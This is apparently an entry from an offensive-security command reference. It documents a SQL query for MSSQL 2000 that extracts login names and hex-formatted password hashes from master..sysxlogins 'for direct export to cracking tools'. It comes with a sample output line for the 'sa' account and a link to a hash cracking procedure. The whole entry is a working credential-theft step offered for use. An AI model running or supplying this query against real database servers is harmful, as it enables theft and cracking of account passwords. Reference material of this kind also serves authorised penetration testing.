---
type: command
executor: sql
data: 'SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - mssql
  - hash-extraction
verified: true
validated: true
---

# mssql-2000-retrieve-name-hashed-password-sysxlogins

## Command

```sql
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```

## Description

Converts and retrieves usernames with hex-formatted password hashes from sysxlogins in MSSQL 2000, suitable for direct export to cracking tools.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Uses built-in fn_varbintohexstr function | No |

## Examples

### Basic Usage

```sql
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```

### With Error Capture (if needed in Query Analyzer)

Run the query and capture hex in error messages if direct output is truncated.

## Expected Output

name    (No column name)
sa      0x010100A29B6D5C0D7F5F5D5C0D7F5F5D...

## Related

- [[procedures/MSSQL-Server-Password-Hash-Extraction-and-Cracking]]
